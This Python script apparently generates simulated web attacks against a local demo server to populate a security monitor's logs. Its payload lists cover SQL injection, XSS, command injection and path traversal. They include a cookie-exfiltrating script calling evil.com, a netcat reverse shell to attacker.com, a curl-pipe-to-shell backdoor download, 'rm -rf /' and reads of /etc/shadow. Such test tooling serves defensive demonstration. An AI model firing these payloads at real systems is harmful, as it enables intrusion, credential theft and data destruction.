#!/usr/bin/env python3
"""
Attack Generator for Demo Purposes
Generates random simulated attacks to populate monitor logs
"""

import threading
import time
import random
import requests
from datetime import datetime

class AttackGenerator:
    """Generates random attacks for demonstration purposes"""

    def __init__(self, base_url='http://localhost:5000', interval=30):
        """
        Initialize attack generator

        Args:
            base_url: Base URL of the application
            interval: Seconds between attacks (default: 30)
        """
        self.base_url = base_url
        self.interval = interval
        self.running = False
        self.thread = None

        # Attack patterns for different attack types
        self.sql_injection_attacks = [
            "' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "1'; DROP TABLE users;--",
            "admin'--",
            "' OR 1=1--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1' AND SLEEP(5)--",
            "' OR 'x'='x",
            "1' UNION SELECT table_name FROM information_schema.tables--",
            "admin' OR '1'='1'#",
        ]

        self.xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(document.cookie)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert(1) autofocus>",
            "<script>fetch('http://evil.com?c='+document.cookie)</script>",
            "<a href=\"javascript:alert(1)\">Click</a>",
            "<embed src=\"javascript:alert(1)\">",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        ]

        self.command_injection_attacks = [
            "; cat /etc/passwd",
            "| ls -la",
            "&& whoami",
            "`id`",
            "$(cat /etc/shadow)",
            "; nc -e /bin/sh attacker.com 4444",
            "| curl http://evil.com/backdoor.sh | sh",
            "&& wget http://malware.com/payload",
            "`rm -rf /`",
            "|| chmod 777 /etc/passwd",
        ]

        self.path_traversal_attacks = [
            "../../../../etc/passwd",
            "../../../windows/system32/config/sam",
            "....//....//....//etc/shadow",
            "..\\..\\..\\boot.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "../../../../../../etc/hosts",
            "../config/database.yml",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd",
            "....\\....\\....\\windows\\win.ini",
        ]

        # Target endpoints
        self.endpoints = [
            '/search',
            '/login',
            '/api/logs',
            '/profile',
            '/comment',
            '/download',
            '/upload',
            '/admin',
            '/data',
            '/query',
        ]

    def generate_attack(self):
        """Generate a random attack request"""
        attack_type = random.choice(['sql', 'xss', 'cmd', 'traversal'])
        endpoint = random.choice(self.endpoints)

        if attack_type == 'sql':
            payload = random.choice(self.sql_injection_attacks)
            param = random.choice(['id', 'user', 'search', 'query', 'username', 'filter'])
        elif attack_type == 'xss':
            payload = random.choice(self.xss_attacks)
            param = random.choice(['comment', 'name', 'bio', 'message', 'title', 'content'])
        elif attack_type == 'cmd':
            payload = random.choice(self.command_injection_attacks)
            param = random.choice(['file', 'cmd', 'exec', 'run', 'process', 'script'])
        else:  # traversal
            payload = random.choice(self.path_traversal_attacks)
            param = random.choice(['file', 'path', 'doc', 'resource', 'page', 'template'])

        return endpoint, param, payload, attack_type

    def send_attack(self):
        """Send a simulated attack request"""
        endpoint, param, payload, attack_type = self.generate_attack()
        url = f"{self.base_url}{endpoint}"

        try:
            # Send GET request with malicious payload
            params = {param: payload}
            response = requests.get(url, params=params, timeout=5)

            timestamp = datetime.now().strftime('%H:%M:%S')
            if response.status_code == 403:
                print(f"[{timestamp}] ✅ Attack blocked: {attack_type.upper()} on {endpoint}?{param}={payload[:30]}...")
            else:
                print(f"[{timestamp}] ⚠️  Attack passed: {attack_type.upper()} on {endpoint} (Status: {response.status_code})")

        except requests.exceptions.ConnectionError:
            print(f"[Attack Generator] ⚠️  Cannot connect to {self.base_url} - Is the server running?")
        except Exception as e:
            print(f"[Attack Generator] Error: {e}")

    def run(self):
        """Main loop - continuously generate attacks"""
        print(f"[Attack Generator] 🚀 Started generating attacks every {self.interval} seconds")
        print(f"[Attack Generator] Target: {self.base_url}")
        print(f"[Attack Generator] Press Ctrl+C to stop")
        print()

        while self.running:
            self.send_attack()
            time.sleep(self.interval)

    def start(self):
        """Start the attack generator in a background thread"""
        if self.running:
            print("[Attack Generator] Already running")
            return

        self.running = True
        self.thread = threading.Thread(target=self.run, daemon=True)
        self.thread.start()
        print(f"[Attack Generator] Started in background (interval: {self.interval}s)")

    def stop(self):
        """Stop the attack generator"""
        if not self.running:
            print("[Attack Generator] Not running")
            return

        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        print("[Attack Generator] Stopped")


def main():
    """Standalone mode - run as script"""
    import argparse

    parser = argparse.ArgumentParser(description='Generate simulated attacks for demo purposes')
    parser.add_argument('--url', default='http://localhost:5000', help='Base URL (default: http://localhost:5000)')
    parser.add_argument('--interval', type=int, default=30, help='Seconds between attacks (default: 30)')
    args = parser.parse_args()

    generator = AttackGenerator(base_url=args.url, interval=args.interval)

    try:
        generator.running = True
        generator.run()
    except KeyboardInterrupt:
        print("\n[Attack Generator] Stopped by user")


if __name__ == '__main__':
    main()
